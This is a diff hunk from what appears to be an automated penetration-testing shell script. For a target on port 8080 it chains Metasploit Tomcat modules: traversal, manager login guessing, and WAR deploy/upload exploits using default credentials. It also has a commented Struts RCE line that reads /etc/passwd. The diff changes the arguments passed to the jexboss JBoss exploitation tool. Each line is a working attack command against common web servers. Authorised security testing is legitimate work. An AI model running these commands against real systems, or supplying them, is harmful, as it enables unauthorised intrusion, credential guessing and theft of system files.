@@ -1036,8 +1036,9 @@ else
 	msfconsole -x "use admin/http/tomcat_administration; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8080; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
 	# EXPERIMENTAL - APACHE STRUTS RCE EXPLOIT
 	# msfconsole -x "use exploit/linux/http/apache_struts_rce_2016-3081; setg RHOSTS "$TARGET"; set PAYLOAD linux/x86/read_file; set PATH /etc/passwd; run;"
-	python jexboss/jexboss.py http://$TARGET:8080
-	python jexboss/jexboss.py https://$TARGET:8080
+	python jexboss/jexboss.py -host http://$TARGET:8080
+	python jexboss/jexboss.py -host https://$TARGET:8080
+	
 fi
 
 if [ -z "$port_8180" ];
